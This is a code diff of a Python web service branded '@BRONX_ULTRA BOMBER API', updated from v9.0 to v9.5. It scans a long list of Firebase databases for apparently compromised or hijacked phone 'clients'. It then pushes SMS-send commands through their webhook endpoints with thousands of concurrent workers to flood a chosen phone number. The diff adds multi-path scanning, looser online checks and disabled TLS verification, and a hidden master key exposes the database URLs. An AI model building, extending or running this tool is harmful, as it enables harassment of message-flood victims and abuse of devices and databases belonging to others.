@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════╗
-║   🔥 @BRONX_ULTRA BOMBER API v9.0 — ULTRA PRO           ║
-║   ▸ Hidden Firebase URLs (only bronx-boss sees)         ║
+║   🔥 @BRONX_ULTRA BOMBER API v9.5 — ULTRA PRO FIXED     ║
+║   ▸ Multi-path scan (/clients, /users, /devices)        ║
+║   ▸ Flexible status check (missing = online)            ║
 ║   ▸ 5000+ Concurrent Workers                            ║
-║   ▸ Full Firebase Scan (261+ URLs)                      ║
-║   ▸ Realtime Device Detection                           ║
-║   ▸ No Timeout — Background Cache                       ║
-║   ▸ Full Symbol/Space/Emoji Support ✅                  ║
-║   ▸ /stop endpoint                                      ║
-║   ▸ Vercel / Render Ready                               ║
+║   ▸ Background auto-scanner (no timeout)                ║
+║   ▸ Hidden Firebase (only bronx-boss)                   ║
+║   ▸ Full Symbol/Emoji Support ✅                        ║
+║   ▸ Render / Vercel Ready                               ║
 ╚══════════════════════════════════════════════════════════╝
 """
 
@@ -35,18 +34,17 @@ VALID_KEYS = {
     "bronx-vip",
     "bronx-pro",
     "bronx-max",
-    "bronx-boss",     # 👑 HIDDEN KEY — only this sees firebase URLs
+    "bronx-boss",     # 👑 HIDDEN KEY
 }
-
 HIDDEN_KEY = "bronx-boss"
 
 # ═══════════════════════════════════════════════════════════
-# 🔥 FIREBASE URLs — ADD 100-500+ HERE
+# 🔥 FIREBASE URLs — YAHAN 100-500+ LINKS DAALO
 # ═══════════════════════════════════════════════════════════
 FIREBASE_URLS = [
-    # ─── Group 1 ───
+    # ── Example (apne links se replace karo) ──────────────
     "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
-     "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
     "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
     "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
     "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
@@ -338,10 +336,7 @@ FIREBASE_URLS = [
 # ═══════════════════════════════════════════════════════════
 # 🚀 APP
 # ═══════════════════════════════════════════════════════════
-app = FastAPI(
-    title="@BRONX_ULTRA BOMBER API v9.0",
-    version="9.0",
-)
+app = FastAPI(title="@BRONX_ULTRA BOMBER API v9.5", version="9.5")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -352,13 +347,25 @@ app.add_middleware(
 # ═══════════════════════════════════════════════════════════
 # ⚙️ SETTINGS — ULTRA FLASH
 # ═══════════════════════════════════════════════════════════
-MAX_CONCURRENT = 5000          # 🔥 5000 parallel workers
-BATCH_CHUNK = 2000
-SCAN_CONCURRENT = 300          # 300 URLs scan at once
-REQUEST_TIMEOUT = 6
-CONNECT_TIMEOUT = 2
-DEVICE_CACHE_TTL = 20          # Cache 20 seconds
-FULL_SCAN_TIMEOUT = 25         # /devices response max wait
+MAX_CONCURRENT      = 5000     # 🔥 Bomb workers
+SCAN_CONCURRENT     = 300      # 🔥 Parallel URL scan
+BATCH_CHUNK         = 2000
+REQUEST_TIMEOUT     = 8
+CONNECT_TIMEOUT     = 4
+DEVICE_CACHE_TTL    = 20       # seconds
+FULL_SCAN_TIMEOUT   = 40       # max wait for /devices
+PER_HOST_LIMIT      = 15
+
+# Try all these paths on every firebase
+DEVICE_PATHS = [
+    "clients.json",
+    "users.json",
+    "devices.json",
+    "data/clients.json",
+    "admin/clients.json",
+    "client.json",
+    "sms/clients.json",
+]
 
 SEND_ENDPOINTS = [
     "clients/{id}/webhookEvent/sendSms.json",
@@ -368,15 +375,15 @@ SEND_ENDPOINTS = [
     "sendSms/{id}.json",
 ]
 
-API_NAME = "@BRONX_ULTRA"
-API_VERSION = "9.0"
+API_NAME    = "@BRONX_ULTRA"
+API_VERSION = "9.5"
 
 # ═══════════════════════════════════════════════════════════
 # 🔴 REDIS (OPTIONAL)
 # ═══════════════════════════════════════════════════════════
 redis = None
 try:
-    REDIS_URL = os.getenv("UPSTASH_REDIS_REST_URL")
+    REDIS_URL   = os.getenv("UPSTASH_REDIS_REST_URL")
     REDIS_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN")
     if REDIS_URL and REDIS_TOKEN:
         from upstash_redis.asyncio import Redis
@@ -389,7 +396,7 @@ except Exception as e:
 _LOCAL_STOP = set()
 
 # ═══════════════════════════════════════════════════════════
-# 🧠 GLOBAL DEVICE CACHE (Background scanned)
+# 🧠 GLOBAL CACHE
 # ═══════════════════════════════════════════════════════════
 _DEVICE_CACHE = {
     "devices": [],
@@ -401,7 +408,6 @@ _DEVICE_CACHE = {
     "empty_fb": 0,
 }
 
-
 # ═══════════════════════════════════════════════════════════
 # 🔑 KEY VERIFICATION
 # ═══════════════════════════════════════════════════════════
@@ -410,72 +416,82 @@ def verify_key(api_key: str) -> bool:
 
 
 def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
-    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
-    if key:
-        return key
+    k = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
+    if k: return k
     auth = request.headers.get("authorization", "")
     if auth.lower().startswith("bearer "):
         return auth[7:].strip()
-    key = query_params.get("key") or query_params.get("api_key")
-    if key:
-        return key
-    key = body_data.get("key") or body_data.get("api_key")
-    if key:
-        return key
+    k = query_params.get("key") or query_params.get("api_key")
+    if k: return k
+    k = body_data.get("key") or body_data.get("api_key")
+    if k: return k
     return ""
-
 
 # ═══════════════════════════════════════════════════════════
 # 🛠️ HELPERS
 # ═══════════════════════════════════════════════════════════
 def clean_url(url: str) -> str:
-    url = url.rstrip("/")
-    if url.endswith(".json"):
-        url = url[:-5]
+    url = url.strip().rstrip("/")
+    for suffix in [".json", "/clients", "/users", "/devices", "/data", "/admin"]:
+        if url.endswith(suffix):
+            url = url[:-len(suffix)]
     return url.rstrip("/")
 
 
-def fix_message(raw_message, is_get: bool) -> str:
-    if raw_message is None:
-        return ""
-    if not isinstance(raw_message, str):
-        raw_message = str(raw_message)
-    msg = raw_message
+def fix_message(raw, is_get: bool) -> str:
+    if raw is None: return ""
+    if not isinstance(raw, str): raw = str(raw)
+    msg = raw
     if is_get:
         msg = msg.replace("+", " ")
     msg = msg.replace("\\n", "\n").replace("\\t", "\t")
     return msg.strip()
 
 
+def is_online_device(v: dict) -> bool:
+    """Flexible: missing status = online, status true = online."""
+    if not isinstance(v, dict):
+        return False
+    if "status" not in v:
+        return True
+    st = v.get("status")
+    return st is True or st == "true" or st == 1 or st == "True"
+
+
 # ═══════════════════════════════════════════════════════════
-# 📡 FETCH DEVICES FROM ONE FIREBASE
+# 📡 FETCH ONE FIREBASE — MULTI-PATH
 # ═══════════════════════════════════════════════════════════
 async def fetch_devices_from(session, url, sem):
     async with sem:
         base = clean_url(url)
-        try:
-            async with session.get(f"{base}/clients.json") as r:
-                if r.status != 200:
-                    return ("offline", url, [])
-                data = await r.json(content_type=None)
-                if not isinstance(data, dict):
-                    return ("empty", url, [])
-                found = []
-                for k, v in data.items():
-                    if isinstance(v, dict) and v.get("status") is True:
-                        found.append({"id": k, "url": base})
-                if not found:
-                    return ("empty", url, [])
-                return ("online", url, found)
-        except Exception:
-            return ("offline", url, [])
+        for path in DEVICE_PATHS:
+            try:
+                async with session.get(
+                    f"{base}/{path}",
+                    ssl=False,
+                    allow_redirects=True,
+                ) as r:
+                    if r.status != 200:
+                        continue
+                    data = await r.json(content_type=None)
+                    if not isinstance(data, dict) or not data:
+                        continue
 
+                    found = []
+                    for k, v in data.items():
+                        if is_online_device(v):
+                            found.append({"id": k, "url": base})
+
+                    if found:
+                        return ("online", url, found)
+            except Exception:
+                continue
+        return ("offline", url, [])
 
 # ═══════════════════════════════════════════════════════════
-# 🌐 FULL SCAN — ALL FIREBASE URLS
+# 🌐 FULL SCAN — ALL FIREBASES PARALLEL
 # ═══════════════════════════════════════════════════════════
 async def full_scan_all_firebases():
-    """Scan ALL firebase URLs in parallel with timeout + update cache."""
     if _DEVICE_CACHE["scanning"]:
         return
     _DEVICE_CACHE["scanning"] = True
@@ -483,13 +499,17 @@ async def full_scan_all_firebases():
 
     connector = aiohttp.TCPConnector(
         limit=SCAN_CONCURRENT,
-        limit_per_host=10,
+        limit_per_host=PER_HOST_LIMIT,
         ttl_dns_cache=600,
-        force_close=False,
+        force_close=True,
+        use_dns_cache=False,
         enable_cleanup_closed=True,
     )
     timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
-    headers = {"User-Agent": f"{API_NAME}/v{API_VERSION}"}
+    headers = {
+        "User-Agent": f"{API_NAME}/v{API_VERSION}",
+        "Accept": "application/json",
+    }
 
     sem = asyncio.Semaphore(SCAN_CONCURRENT)
     all_devices = []
@@ -522,19 +542,19 @@ async def full_scan_all_firebases():
     _DEVICE_CACHE["offline_fb"] = offline
     _DEVICE_CACHE["empty_fb"] = empty
 
-    print(f"✅ FULL SCAN done in {round(time.time()-t0,2)}s | "
-          f"OnlineFB={online} Empty={empty} Offline={offline} | "
+    print(f"✅ SCAN done in {round(time.time()-t0,2)}s | "
+          f"FB: online={online} empty={empty} offline={offline} | "
           f"Devices={len(all_devices)}")
 
 
 async def get_all_devices(force_refresh=False):
-    """Return cached devices. If stale or forced, trigger background rescan."""
     age = time.time() - _DEVICE_CACHE["ts"]
     if force_refresh or age > DEVICE_CACHE_TTL or not _DEVICE_CACHE["devices"]:
-        # Await a fresh scan (but scan itself uses timeout per URL, so max ~6s)
-        await asyncio.wait_for(full_scan_all_firebases(), timeout=FULL_SCAN_TIMEOUT + 5)
+        try:
+            await asyncio.wait_for(full_scan_all_firebases(), timeout=FULL_SCAN_TIMEOUT)
+        except asyncio.TimeoutError:
+            print("⚠️ scan timeout — using stale cache")
     return _DEVICE_CACHE["devices"]
-
 
 # ═══════════════════════════════════════════════════════════
 # 💣 SEND ONE
@@ -553,7 +573,7 @@ async def send_one(session, device, target, message, sem, stats, stop_check):
         for ep in SEND_ENDPOINTS:
             url = f"{device['url']}/{ep.format(id=device['id'])}"
             try:
-                async with session.put(url, json=payload) as r:
+                async with session.put(url, json=payload, ssl=False) as r:
                     if r.status in (200, 201):
                         stats["success"] += 1
                         return True
@@ -571,34 +591,27 @@ async def is_stopped(number: str) -> bool:
         return True
     if redis:
         try:
-            val = await redis.get(f"stop:{number}")
-            return val is not None
+            return (await redis.get(f"stop:{number}")) is not None
         except Exception:
             return False
     return False
 
-
 # ═══════════════════════════════════════════════════════════
-# 💣 ULTRA FLASH WORKER — 5000+ CONCURRENT
+# 💣 BOMB WORKER — 5000+ CONCURRENT
 # ═══════════════════════════════════════════════════════════
 async def bomb_worker(number: str, message: str, count: int, api_key: str):
     jid = str(uuid4())[:8]
     t0 = time.time()
 
     if redis:
-        try:
-            await redis.delete(f"stop:{number}")
-        except Exception:
-            pass
+        try: await redis.delete(f"stop:{number}")
+        except Exception: pass
     _LOCAL_STOP.discard(number)
 
     connector = aiohttp.TCPConnector(
-        limit=0,
-        limit_per_host=0,
-        ttl_dns_cache=600,
-        force_close=False,
-        enable_cleanup_closed=True,
-        use_dns_cache=True,
+        limit=0, limit_per_host=0,
+        ttl_dns_cache=600, force_close=False,
+        enable_cleanup_closed=True, use_dns_cache=True,
     )
     timeout = aiohttp.ClientTimeout(
         total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=REQUEST_TIMEOUT
@@ -612,7 +625,6 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
     async with aiohttp.ClientSession(
         connector=connector, timeout=timeout, headers=headers
     ) as session:
-        # Force fresh scan so we hit ALL 4749+ devices
         devices = await get_all_devices(force_refresh=True)
         if not devices:
             print(f"[{jid}] ❌ No devices online")
@@ -661,7 +673,6 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
         print(f"[{jid}] ✅ DONE | Sent={stats['success']} Failed={stats['failed']} "
               f"Blocked={stats['blocked']} | {el}s | {sp}/s")
 
-
 # ═══════════════════════════════════════════════════════════
 # 🌐 ROUTES
 # ═══════════════════════════════════════════════════════════
@@ -686,9 +697,7 @@ async def health():
     return {"status": "ok", "time": datetime.now().isoformat()}
 
 
-# ═══════════════════════════════════════════════════════════
-# 🚀 /send
-# ═══════════════════════════════════════════════════════════
+# ─── /send ────────────────────────────────────────────────
 @app.api_route("/send", methods=["GET", "POST"])
 async def send_endpoint(request: Request, bg: BackgroundTasks):
     is_get = request.method == "GET"
@@ -727,8 +736,7 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
 
     try:
         count = int(count_str)
-        if count <= 0:
-            raise ValueError
+        if count <= 0: raise ValueError
     except Exception:
         return JSONResponse({"success": False, "error": "invalid count"}, 400)
 
@@ -748,9 +756,7 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
     }
 
 
-# ═══════════════════════════════════════════════════════════
-# 🛑 /stop
-# ═══════════════════════════════════════════════════════════
+# ─── /stop ────────────────────────────────────────────────
 @app.get("/stop")
 async def stop_endpoint(request: Request, number: str = Query(None), key: str = Query(None)):
     api_key = key or request.headers.get("x-api-key") or ""
@@ -767,17 +773,13 @@ async def stop_endpoint(request: Request, number: str = Query(None), key: str = 
     number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
     _LOCAL_STOP.add(number)
     if redis:
-        try:
-            await redis.set(f"stop:{number}", "1", ex=300)
-        except Exception:
-            pass
+        try: await redis.set(f"stop:{number}", "1", ex=300)
+        except Exception: pass
 
     return {"success": True, "message": f"🛑 Stop sent for {number}", "number": number}
 
 
-# ═══════════════════════════════════════════════════════════
-# 📱 /devices — HIDDEN FIREBASE URLS (only bronx-boss)
-# ═══════════════════════════════════════════════════════════
+# ─── /devices ─────────────────────────────────────────────
 @app.get("/devices")
 async def devices_endpoint(request: Request, key: str = Query(None), refresh: int = Query(0)):
     api_key = key or request.headers.get("x-api-key") or ""
@@ -789,7 +791,6 @@ async def devices_endpoint(request: Request, key: str = Query(None), refresh: in
     if not verify_key(api_key):
         return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)
 
-    # Force fresh scan if requested or cache stale
     await get_all_devices(force_refresh=bool(refresh))
 
     devices = _DEVICE_CACHE["devices"]
@@ -813,7 +814,6 @@ async def devices_endpoint(request: Request, key: str = Query(None), refresh: in
             if _DEVICE_CACHE["ts"] else None,
     }
 
-    # 🔒 Hidden data only for bronx-boss
     if is_boss:
         response["per_firebase"] = dict(fb_group)
         response["devices"] = devices
@@ -821,9 +821,7 @@ async def devices_endpoint(request: Request, key: str = Query(None), refresh: in
     return response
 
 
-# ═══════════════════════════════════════════════════════════
-# 🌐 /firebases — HIDDEN (only bronx-boss)
-# ═══════════════════════════════════════════════════════════
+# ─── /firebases ───────────────────────────────────────────
 @app.get("/firebases")
 async def firebases_endpoint(request: Request, key: str = Query(None)):
     api_key = key or request.headers.get("x-api-key") or ""
@@ -852,9 +850,11 @@ async def firebases_endpoint(request: Request, key: str = Query(None)):
 
 
 # ═══════════════════════════════════════════════════════════
-# ♻️ BACKGROUND AUTO-SCANNER (keeps cache warm, no timeout)
+# ♻️ BACKGROUND AUTO-SCANNER
 # ═══════════════════════════════════════════════════════════
 async def auto_scanner():
+    # Initial scan
+    await asyncio.sleep(2)
     while True:
         try:
             await full_scan_all_firebases()
